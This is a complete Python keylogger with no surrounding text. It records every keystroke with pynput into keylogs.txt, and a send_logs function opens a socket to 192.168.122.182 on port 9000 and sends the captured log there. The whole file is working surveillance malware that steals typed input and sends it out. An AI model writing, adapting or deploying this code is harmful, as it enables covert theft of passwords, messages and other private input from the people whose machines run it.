import pynput.keyboard
import socket

def on_press(key):
    with open("keylogs.txt", "a") as f:
        f.write(str(key) + "\n")
    print(f"Key {key} pressed")

def send_logs():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.122.182", 9000))
    with open("keylogs.txt", "rb") as f:
        data = f.read()
        s.sendall(data)
    s.close()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()

send_logs()